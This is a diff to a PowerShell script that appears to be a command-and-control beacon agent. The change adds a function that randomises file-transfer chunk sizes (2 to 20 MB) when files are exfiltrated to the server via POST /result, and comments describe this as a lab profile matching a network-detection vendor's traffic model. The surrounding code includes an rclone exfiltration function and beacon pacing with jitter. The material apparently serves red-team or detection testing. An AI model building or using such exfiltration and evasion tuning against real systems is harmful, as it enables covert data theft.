@@ -36,6 +36,7 @@
 #                       $true = use Windows logon for proxy authentication (NTLM/Kerberos).
 #
 # Download transfer (agent → server file_upload chunks)
+#   Chunk sizes vary per POST (2 / 5 / 10 / 20 MB raw) on POST /result — Vectra sendBytes[] lab profile.
 #   $downloadBurst       $false = pace each chunk like the beacon (sleep + jitter between POSTs).
 #                       $true  = send all chunks back-to-back (throughput / lab only).
 #
@@ -1419,6 +1420,20 @@ function Invoke-RmmRcloneExfil {
     }
 }
 
+function Get-RmmDownloadChunkBytes {
+    param([Parameter(Mandatory = $true)][long]$Remaining)
+    # Vectra-style sendBytes[] on POST /result: vary raw payload per chunk (2 / 5 / 10 / 20 MB).
+    # Small entries in the array come from beacons and download_progress between chunks.
+    $tiers = @(
+        2 * 1024 * 1024,
+        5 * 1024 * 1024,
+        10 * 1024 * 1024,
+        20 * 1024 * 1024
+    )
+    $pick = $tiers[(Get-Random -Maximum $tiers.Count)]
+    return [int][Math]::Min([long]$pick, $Remaining)
+}
+
 function Send-RmmFileDownload {
     param(
         [Parameter(Mandatory = $true)][string]$FilePath,
@@ -1427,7 +1442,6 @@ function Send-RmmFileDownload {
     )
     $fileName = Split-Path $FilePath -Leaf
     $uploadId = [guid]::NewGuid().ToString('N')
-    $chunkBytes = 6MB
     $resultUrl = "$u/result?id=$sessionId&type=file_upload"
     $lastSentPct = -1.0
     $lastSentAt = [DateTime]::MinValue
@@ -1460,6 +1474,9 @@ function Send-RmmFileDownload {
             return
         }
         while ($true) {
+            $remaining = [long]($fileLen - $offset)
+            if ($remaining -le 0) { break }
+            $chunkBytes = Get-RmmDownloadChunkBytes -Remaining $remaining
             $buf = New-Object byte[] $chunkBytes
             $n = $fs.Read($buf, 0, $chunkBytes)
             if ($n -le 0) { break }
